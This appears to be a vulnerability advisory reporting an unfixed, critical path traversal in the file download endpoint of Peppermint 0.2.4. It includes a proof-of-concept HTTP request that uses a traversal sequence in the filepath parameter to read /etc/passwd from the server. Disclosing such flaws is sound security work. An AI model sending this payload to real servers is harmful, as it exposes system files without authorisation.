# Peppermint-Lab  - Path Traversal


**CVE-ID:** -


**Vendor:** [Peppermint-Lab](https://peppermint.sh)

**Affected Product:** Peppermint

**Affected Versions:** 0.2.4

**Vulnerability:** Path Traversal

**Status:** Unfixed

**Severity:** Critical



## Details

The application allows users to download files.
The `filepath` parameter is vulnerable to a path traversal resulting in reading/downloading arbitrary files from the server.


```http
POST /api/v1/users/file/download?filepath=./../../../../../etc/passwd HTTP/1.1
Host: localhost:5000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryb7JNKIvHMye0lm1h
[...]

------WebKitFormBoundaryb7JNKIvHMye0lm1h--
```

